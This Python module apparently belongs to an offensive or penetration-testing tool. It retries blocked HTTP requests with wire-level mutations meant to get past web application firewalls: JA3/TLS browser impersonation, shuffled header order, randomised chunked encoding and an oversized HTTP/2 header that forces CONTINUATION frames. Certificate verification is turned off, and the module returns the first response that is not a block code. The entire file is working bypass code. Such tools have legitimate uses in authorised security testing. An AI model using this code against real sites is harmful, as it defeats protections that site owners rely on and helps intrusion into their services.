"""Transport-level mutations for WAF / parser differential bypass.

Non-destructive: each mutator sends the same logical request with a
different wire-level encoding. Callers should only use the result when the
baseline is a 403/406/419/429/503 so a successful mutation is strong
evidence the WAF and backend disagree on parsing.
"""
import json
import random
import ssl
import socket
from urllib.parse import urlparse

try:
    import h2.connection
    import h2.config
    import h2.events
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False


_PROFILES = [
    "chrome120", "chrome124", "chrome131",
    "safari_ios_17_2", "safari15_3", "safari17_0",
    "firefox133",
]

_BLOCK_CODES = (403, 406, 419, 429, 503)


def _body_bytes(json_body, data):
    if json_body is not None:
        return json.dumps(json_body).encode("utf-8")
    if data is None:
        return b""
    return data.encode("utf-8") if isinstance(data, str) else data


class TransportMutator:
    def __init__(self):
        self.profiles = list(_PROFILES)

    def mutate_ja3(self, method, url, headers=None, json_body=None,
                   data=None, params=None):
        if not HAS_CURL_CFFI:
            return {"status": None, "error": "curl_cffi not installed",
                    "mutator": "ja3_failed"}
        profile = random.choice(self.profiles)
        h = dict(headers or {})
        h.setdefault("Accept", "application/json")
        try:
            resp = cffi_requests.request(
                method.upper(), url, headers=h, json=json_body,
                content=data, params=params,
                impersonate=profile, timeout=10, verify=False,
            )
            return {"status": resp.status_code, "body": resp.text,
                    "headers": dict(resp.headers),
                    "mutator": f"ja3_{profile}"}
        except Exception as e:
            return {"status": None,
                    "error": f"{type(e).__name__}: {e}",
                    "mutator": "ja3_failed"}

    def mutate_header_order(self, method, url, headers=None,
                            json_body=None, data=None, params=None):
        if not HAS_CURL_CFFI:
            return {"status": None, "error": "curl_cffi not installed",
                    "mutator": "header_order_failed"}
        items = list((headers or {}).items())
        random.shuffle(items)
        h = dict(items)
        h.setdefault("Accept", "application/json")
        try:
            resp = cffi_requests.request(
                method.upper(), url, headers=h, json=json_body,
                content=data, params=params,
                impersonate="chrome124", timeout=10, verify=False,
            )
            return {"status": resp.status_code, "body": resp.text,
                    "headers": dict(resp.headers),
                    "mutator": "header_order"}
        except Exception as e:
            return {"status": None,
                    "error": f"{type(e).__name__}: {e}",
                    "mutator": "header_order_failed"}

    def mutate_chunked(self, method, url, headers=None, json_body=None,
                       data=None, params=None):
        from . import http as _http
        h = dict(headers or {})
        if json_body is not None:
            h["Content-Type"] = "application/json"
        payload = _body_bytes(json_body, data)
        h["Transfer-Encoding"] = "chunked"
        h.pop("Content-Length", None)
        chunks = []
        i = 0
        while i < len(payload):
            size = random.randint(4, 20)
            chunk = payload[i:i + size]
            i += size
            chunks.append(format(len(chunk), "x").encode()
                          + b"\r\n" + chunk + b"\r\n")
        chunks.append(b"0\r\n\r\n")
        body = b"".join(chunks)
        try:
            with _http.Client(timeout=10, verify=False,
                              follow_redirects=False) as c:
                r = c.request(method.upper(), url, headers=h, content=body)
                return {"status": r.status_code, "body": r.text,
                        "headers": dict(r.headers), "mutator": "chunked"}
        except Exception as e:
            return {"status": None,
                    "error": f"{type(e).__name__}: {e}",
                    "mutator": "chunked_failed"}

    def mutate_h2_continuation(self, method, url, headers=None,
                               json_body=None, data=None, params=None):
        if not HAS_H2:
            return {"status": None, "error": "h2 not installed",
                    "mutator": "h2_skipped"}
        p = urlparse(url)
        host = p.hostname or ""
        port = p.port or (443 if p.scheme == "https" else 80)
        use_tls = p.scheme == "https"
        path = p.path or "/"
        if p.query:
            path += "?" + p.query
        body_bytes = _body_bytes(json_body, data)
        sock = None
        try:
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(["h2"])
                sock = ctx.wrap_socket(
                    socket.create_connection((host, port), timeout=10),
                    server_hostname=host,
                )
                if sock.selected_alpn_protocol() != "h2":
                    return {"status": None,
                            "error": "server did not negotiate h2",
                            "mutator": "h2_skipped"}
            else:
                sock = socket.create_connection((host, port), timeout=10)
        except Exception as e:
            return {"status": None,
                    "error": f"{type(e).__name__}: {e}",
                    "mutator": "h2_failed"}
        try:
            cfg = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=cfg)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            h2_headers = [
                (":method", method.upper()),
                (":authority", host),
                (":scheme", "https" if use_tls else "http"),
                (":path", path),
            ]
            if body_bytes:
                h2_headers.append(("content-type", "application/json"))
                h2_headers.append(("content-length", str(len(body_bytes))))
            for k, v in (headers or {}).items():
                h2_headers.append((k.lower(), str(v)))
            h2_headers.append(("x-sc-split", "A" * 8000))
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, h2_headers, end_stream=False)
            if body_bytes:
                conn.send_data(sid, body_bytes, end_stream=False)
            conn.send_data(sid, b"", end_stream=True)
            sock.sendall(conn.data_to_send())
            sock.settimeout(10)
            status = None
            try:
                while True:
                    chunk = sock.recv(65535)
                    if not chunk:
                        break
                    events = conn.receive_data(chunk)
                    for ev in events:
                        if isinstance(ev, h2.events.ResponseReceived):
                            status = dict(ev.headers).get(":status")
                            break
                    if status:
                        break
            except socket.timeout:
                pass
            return {"status": int(status) if status else None,
                    "body": "", "headers": {},
                    "mutator": "h2_continuation"}
        except Exception as e:
            return {"status": None,
                    "error": f"{type(e).__name__}: {e}",
                    "mutator": "h2_failed"}
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def run(self, method, url, headers=None, json_body=None,
            data=None, params=None):
        for mutator in (
            self.mutate_ja3,
            self.mutate_header_order,
            self.mutate_chunked,
            self.mutate_h2_continuation,
        ):
            res = mutator(method, url, headers, json_body, data, params)
            if res.get("status") and res["status"] not in _BLOCK_CODES:
                return res
        return {"status": None, "error": "all mutations failed",
                "mutator": "exhausted"}
